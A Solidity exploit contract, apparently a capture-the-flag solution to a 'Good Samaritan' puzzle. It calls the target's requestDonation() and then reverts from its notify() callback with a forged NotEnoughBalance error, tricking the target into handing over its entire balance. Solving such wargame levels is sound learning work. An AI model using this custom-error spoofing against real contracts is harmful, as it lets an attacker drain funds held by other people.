// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

error NotEnoughBalance();

interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}

contract FakeNotEnoughBalance {
    address samaritan;

    function pwn(address _samaritan) external {
        samaritan = _samaritan;
        IGoodSamaritan(samaritan).requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
